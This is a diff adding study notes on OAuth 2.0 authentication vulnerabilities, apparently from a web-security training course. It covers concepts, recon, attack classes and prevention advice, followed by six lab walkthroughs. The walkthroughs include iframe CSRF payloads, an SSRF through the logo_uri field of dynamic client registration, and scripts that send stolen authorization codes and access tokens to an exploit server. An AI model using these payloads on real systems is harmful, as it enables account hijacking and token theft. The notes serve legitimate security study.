@@ -1,0 +1,235 @@
+OAuth 2.0 authentication vulnerabilities
+- Commonly used authorization framework that enable website to request limit access to user's account on another application
+- Allow user grant this access without exposing their login credential
+- User can fine-tine which data they want to share rather than haing full control of their account to third party
+- Note:
+    + OAuth 2.0 is current standard, some web still use legacy version 1.0
+    + Version 2.0 was written from scratch rather than being developed directly from 1.0
+    + In this topic OAuth refer to OAuth 2.0
+
+- Client application: website that want to access user's data
+- Resource owner: user whose data the application want to access
+- OAuth service provider: website control user's data and access to it, support OAuth by providing API for interacting with both an authorization server and resource server
+
+- There are numerous ways OAuth can be implemented, known as OAuth "flow" or "grant types"
+- In this topic, we focus on "authorization code" and "implicit" grant types, both involve following stages:
+    1. Client app request access to a subset of user's data, specifying which grant type they want to use and what kind of access they want
+    2. User is prompted to login OAuth service and explicitly give their consent for requested access
+    3. Client app receives unique access token that prove they have permission to access requested data
+    4. Client app use this token to make API call fetching relevant data from resource server
+
+OAuth authentication:
+- From end-user perspective, the result is similar to SSO (single sign-on)
+- Process:
+    + User uses social media OAuth service to request access some data that can use to identify user
+    + After receiving access token, request this data from resource server, typically a dedicated /userinfo enpoint
+    + Once received data, client app uses it in place of username to log the user in. Acess token received frmo authorization server is often used instead of traditional password
+
+How do OAuth authentication vulnerabilities arise?
+- Partly because OAuth specification is relatively vague and flexible by design
+- Majority of the implementation is completely optional
+- General lack of built-in security features
+- Rely almost entirely on dev using right combination of config option and implementing their own additional security measures on top
+- Depend on grant type, highly sensitive data is also sent via the browser, which presents various opportunities for an attacker to intercept it
+
+Identifying OAuth authentication:
+- See option to login using account from different website (high chance using OAuth2)
+- Using burp suite traffic, first request always be a request to /authorization endpoint contain a number of query params that are used specifically for OAuth
+    + client_id, redirect_uri, response_type parameters
+
+Recon:
+- If external OAuth service is used, you should be identify specific provider fmro hostname
+- There is often detailed document available tell you all kind of useful information, such as name of endpoints and which confg options being used
+- Standard endpoints:
+    + /.well-known/oauth-authorization-server
+    + /.well-known/openid-configuration
+
+Exploiting OAuth authentication vulnerabilities
+- Vulnerabilities in the OAuth client application:
+    + Often use a reputable, battle-hardened OAuth service that well protected against widely known exploits. But maybe their own side implement is less secure
+    + Improper implementation of the implicit grant type (1)
+        + Access token go through browser in url fragment, it mainly recommended for single-page application. However also often used in classic client web because of its relative simplicity
+        + Token only exist in browser, if user close tab will lost that session. To keep login session, client app send that data (userId+access_token) to server by POST method, server will set session cookie for user
+        + But this POST request impicitly trust without password -> just change param then attacker can impersonate any user
+    + Flawed CSRF protection (3)
+        + Many components are optional, but some strongly recommended unless there's an important reason not to use them (example: state param)
+        + state param: should contain unguessable value, such as hash of something tied to user session as a form of CSRF
+        + Therefore, if you notice that authorization request does not send state param
+        + So it means attacker can initiate OAuth flow before trick user into completing it, similar to traditional CSRF attack
+- Leaking authorization codes and access tokens: (4)    
+    + Attacker could steal valid code or token to access victim's data
+    + Depend on grant type, either code or token is sent via victim's browser to the /callback endpoint specified in redirect_uri param of authorization request
+    + If service fail to validate this URI properly, attacker could construct CSRF attack that will send code or token attacker has full controlled
+    + Note: more secure authorization server will require redirect_uri param to be sent when exchanging code, and then check whether this matches the one received in initial authorization request
+- Flawed redirect_uri validation:
+    + Best practice is to provide whitelist callback URIs when registering OAuth
+    + Try experimenting redirect_uri to understand how it validated:
+        + Some implement allow range of subdirectories by checking string start with correct sequence (try remove, adding arbitrary path, query param, fragment to see without trigger error)
+        + If can append extra values to redirect_uri, might able to exploit discrepancies between the parsing of URI by different components of OAuth
+            Example:
+                https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
+                Check the SSRF and CORS example
+        + You can try duplicate redirect_uri param (server-side parameter pollution vuln)
+        + Some give special treatmentto localhost URIs as they're often used during development
+            Example: localhost.evil-user.net
+    + Shouldn't limit with just redirect_uri, can try different combination of change
+        + Sometimes, changing 1 param can affect validation of others
+        + Example: 
+            response_mode = query --> response_mode = fragment can sometimes alter the parsing of redirect_uri, allow to submit URIs blocked
+            if web_message mode is supported, often allow wider range of subdomains in redirect_uri
+- Stealing codes and access tokens via a proxy page (5)
+    + Against more robust target, you might find no matter what you try, unable to success submit external domain as redirect_uri
+    + Don't give up, try to point out if it work on any other pages of whitelist domain
+    + Try path traversal
+    + Once identify, you should audit for additional vuln that you can leak code or token
+    + For authorization code flow, you need find vuln give you access to query param
+    + For implicit grant type, you need to extract the URL fragment
+        + Steal access token doesn't enavle to login victim account, entire implicit flow takes place via browser
+        + But you can still use token to call API to OAuth server, may enable fetch sensitive user data that cannot normally access fmro client app UI
+
+    + In addition to open redirect, you should look for any vuln allow extract code or token and send to external domain. (6)
+    + Example:
+        + Dangerous JS handles query params and URL fragment: may identify long gadget chain allow to pass token through series of scripts before leak it to external domain
+        + XSS vuln: 
+        + HTML injection vuln: if can point redirect_uri to attacker page, might leak code via Referer header, when attemp to fetch image, some browser send full url in referer header of request, including query string
+
+- Flawed scope validation:
+    + In any OAuth, user permission is based on scope idefine in authorized request
+    + But in some case, possible for attacker to upgrade access token with extra permissions due to flawed validation, process depend on grant type
+    + Scope upgrade: authorization code flow
+        + Attacker build malicious application initially requested access to user's email address using openid email scope
+        + In short, this talk about attacker send their own request contain attacker id and manipulate scope of access by changing scope param to extent access permission
+        + Example: scope=openid email -> scope=openid email profile
+    + Scope upgrade: implicit flow
+        + Steal access_token. request to /userinfo path, adding scope param
+        + OAuth service should validate scope values, but this isn't always the case
+            + If adjusted permission don't exceed level of access previously granted
+            + Attacker can access additional data without require approval from user
+
+- Unverified user registration:
+    + Some app make implicit assumption that information stored by OAuth is correct
+    -> Dangerous assumption
+    + Some OAuth provider allow register without verify email 
+    + Attacker use victim's email and no verify needed (now information is not trustworthy)
+    + Client app may allow attacker sign in as victim via fraudulent account
+
+How to prevent:
+- It is essential for both OAuth provider and client app to implement robust validation of input, especially the redirect_uri param
+- For OAuth service providers:
+    + Whitelist redierct_uris, if possible, use strict byte-for-byte comparison to validate. Only allow complete and exact matches rather than pattern matching
+    + Enforce use of state param (avoid CSRF attack), value should contain to user's session, specific data,...
+    + On resource server, verify that access token was issued to same client_id that make request. Also check scope being requested to make sure this matches scope which token was originally granted
+- For OAuth client applications:
+    + Make sure fully understand how OAuth works before implementing it. Many vuln caused by a simple lack of understanding what exactly happening at each stage and how this can potentially be exploited
+    + Use state param even though it is not mandatory
+    + Send redirect_uri to both /authorization and /token endpoint
+    + When dev mobile or native desktop app, it is often not possible to keep client_secret private. In these situations, PKCE (RFC7636) mechanism may used to provide additional protection against access code interception or leakage
+    + If use OpenID Connect id_token, make sure it properly validated according to JSON Web Signature, JSON Web Encryption, and OpenID specifications
+    + Becareful with authorization codes, they may be leaked via Referer headers when external images, scripts, CSS content is loaded. Not include them in dynamically JS files as they may be executed from external domain  via <script> tags
+
+
+
+01_Authentication_bypass_via_OAuth_implicit_flow
+- Just using social login normaly
+- But in last step, /authentication endpoint is flaw in logic
+    + Just change email to carlos email, and then you can login without password
+
+02_SSRF_via_OpenID_dynamic_client_registration
+- Try finding valid standard endpoint by manual
+    + Found {oauth_url}/.well-known/openid-configuration is exist and allow access
+    + Notice the /reg path, it is a dynamic client registration
+    + Modify payload by adding POST /reg, Content-Type and Accept to application/json and request body:
+        {
+            "redirect_uris": [
+                "https://client-app.com/callback",
+                "https://client-app.com/callback2"
+            ]
+        }
+    + Status 201, success register new client app
+- Audit the OAuth flow
+    + Notice that in Authorize page, where user consent permissions, display app's logo
+    + It fetched from /client/{client_id}/logo
+    + Adding "logo_uri" to json payload when register with value is target endpoint in lab description
+- After that, just send GET request to /client/{client_id}/logo to fetch the secret access key
+    + You will got a json of secret data
+    + Find SecretAccessKey var and submit it
+
+03_Forced_OAuth_profile_linking
+- As lab description, we know that this is vuln in CSRF attack
+- After try to login using credential
+    + We notice that it's possible to attach social profile to account
+    + If you try that, the last step is verify by url contain oauth_code
+- In the redirect step to /oauth-linking?code={oauth_code} don't have any csrf token
+    + It mean that we can send this path to victim to cause csrf
+    + Note: only possible if victim already login to social account once before, so when they just click that url contain oauth_code, it will overide victim info to your social account profile that you have full control
+- Wait until victim click that, logout your social account and login again to get update
+- Payload:
+    <iframe src="{url}/oauth-linking?code={oauth_code}"></iframe>
+
+04_OAuth_account_hijacking_via_redirect_uri
+- In this lab, we can steal victim code by csrf attack
+- Construct a payload pointing to exploit server
+    + Because of code is a param auto adding to redirect_uri
+    + We just have to put redirect_uri={exploit_url}, code will return in /log as a param
+- Payload:
+    <iframe src="{oauth_url}/auth?client_id=abc&redirect_uri={exploit_url}&response_type=code&scope=openid%20profile%20email"></iframe>
+
+05_Stealing_OAuth_access_tokens_via_an_open_redirect
+- We notice that redirect_uri is blocked other domains
+    + Try and identify that it is allowed if using prefix sequence same as default
+    + Depend on that, we try more and know that if vuln to path traversal
+- If you click the blog page, you will see the api to access next post
+    + You will notice that it is using path param to redirect page
+- What if we combine the path traversal and redirect page
+    + We can bypass the filter in redirect_uri by contruct payload look like
+        /oauth-callback/../post/next?path={exploit_url}/exploit
+- Here i will explain why we need to redirect to path /exploit
+    + First we need 2 step to get the access_token
+        + Step 1: If not location.hash we have to login first by use something like payload above (combine path traversal + redirect)
+        + Step 2: Fetch the url to /log and concat location.hash.substring(1)
+    + But normal payload can only perform 1 action at the same time
+    + So we trigger the second action by let victim go to the 'View exploit' in exploit server
+- Payload:
+    <script>
+        if (location.hash) {
+            fetch('{exploit_url}/log?' + location.hash.substring(1));
+        } else {
+            document.write('<iframe src="{oauth_url}/auth?client_id=client_id&redirect_uri={url}/oauth-callback/../post/next?path={exploit_url}/exploit&response_type=token&nonce=195789866&scope=openid%20profile%20email"></iframe>');
+        }
+    </script>
+    
+06_Stealing_OAuth_access_tokens_via_a_proxy_page
+- We notice that comment section is using iframe link to /post/comment/comment-form
+    + Read the script of how this working
+        parent.postMessage({type: 'onload', data: window.location.href}, '*')
+        function submitForm(form, ev) {
+            ...
+            parent.postMessage({type: 'oncomment', content: o}, '*');
+            ...
+        }
+- Look at the targetWindow.postMessage(message, targetOrigin, [transfer]) method
+    + Because of not wrapped in anything, it run everytime page onload
+    + targetWindow:
+        + window: object reference to itself
+        + parent: the direct parent of window object
+        + window.top: top most window in frame hierarchy
+    + postMessage():
+        + Not like fetch() method request through network, this only perform in RAM of browser
+        + Allow 2 JS context (window) to exchange data directly via browser, not the code itself
+- In this case we can embedded iframe in attacker server, so window = lab domain, parent = attacker server
+    + Follow Same-Origin Policy, JS are not allow to read property of window object different origin, it will throw SecurityError
+        + But postMessage() is exception, it designed to allow cross-origin by targetOrigin param, it will check origin before deliver message
+        + In this case targetOrigin = '*', so it means that skip check origin before deliver and trust all site (include attacker's server)
+- Like the 05 lab, redirect_uri is also vuln in path traversal and the access_token is in fragment of url
+    + Redirect it to this path
+        /oauth-callback/../post/comment/comment-form
+    + Then once the redirect_uri loaded, fragment will include in comment-form url
+    + The parent.postMessage auto-fire on load -> deliver data to parent (attacker's page)
+    + Attacker's listener (window.addEventListener) receive it, then fetch() to their own exploit server
+- Payload:
+    <iframe src="{oauth_url}/auth?client_id=client_id&redirect_uri={url}/oauth-callback/../post/comment/comment-form&response_type=token&nonce=195789866&scope=openid%20profile%20email"></iframe>
+    <script>
+        window.addEventListener('message', function(e) {{
+            fetch('{exploit_url}/log?data=' + encodeURIComponent(e.data.data));
+        }}, false);
+    </script>
